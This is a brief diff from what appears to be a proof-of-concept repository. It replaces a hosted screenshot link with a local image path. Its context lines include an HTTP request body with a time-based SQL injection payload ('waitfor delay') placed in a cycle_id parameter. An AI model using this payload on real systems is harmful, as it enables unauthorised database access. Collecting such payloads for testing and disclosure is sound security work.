@@ -23,4 +23,4 @@ Content-Length: 60
 params=&isAction=2&cycle_id=2;waitfor%20delay%20'0:0:5'--%20
 ```
 
-![f6c354c850bd15f2741ccad6633bea6f](https://github.com/wy876/POC/assets/139549762/b76e979f-959e-4c72-998c-ed9afde9bf96)
+![f6c354c850bd15f2741ccad6633bea6f](../../images/b76e979f-959e-4c72-998c-ed9afde9bf96.png)
